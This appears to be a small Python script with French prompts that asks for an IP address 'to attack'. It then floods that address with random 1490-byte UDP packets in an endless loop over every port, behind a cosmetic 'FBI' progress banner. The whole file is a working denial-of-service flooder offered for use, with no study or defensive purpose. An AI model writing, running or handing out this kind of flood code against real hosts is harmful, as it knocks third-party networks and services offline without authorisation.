import os
import socket
import random
import time

##############
site = input("Ip a attaquer : ")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

print("=======================")
print("==        FBI        ==")
time.sleep(0.100)
print("[===                  ]")
time.sleep(0.100)
print("[=====                ]")
time.sleep(0.100)
print("[========             ]")
time.sleep(0.100)
print("[============         ]")
time.sleep(0.100)
print("[===============      ]")
time.sleep(0.100)
print("[=====================]")
#############

port = 1
sent = 0
while True:
    print(port)
    sock.sendto(bytes, (site,port))
    sent = sent + 1 
    port = port + 1
    invite = port + 1
    if port == 65534:
        port = 1
        
# python3 main.py